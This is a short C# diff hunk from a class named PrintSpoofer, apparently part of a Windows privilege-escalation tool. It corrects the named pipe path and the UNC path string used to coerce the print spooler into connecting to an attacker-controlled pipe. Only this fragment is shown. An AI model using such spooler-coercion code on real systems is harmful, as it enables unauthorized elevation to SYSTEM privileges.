@@ -21,7 +21,7 @@ internal static class PrintSpoofer
     )
     {
         var computerName = Environment.MachineName;
-        var pipe = $"\\\\.\\pipe\\{pipeName}\\spoolss";
+        var pipe = $"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss";
         byte[] commandBytes = Encoding.Unicode.GetBytes(
             $"\\\\{computerName} \\\\{computerName}/pipe/{pipeName}"
         );
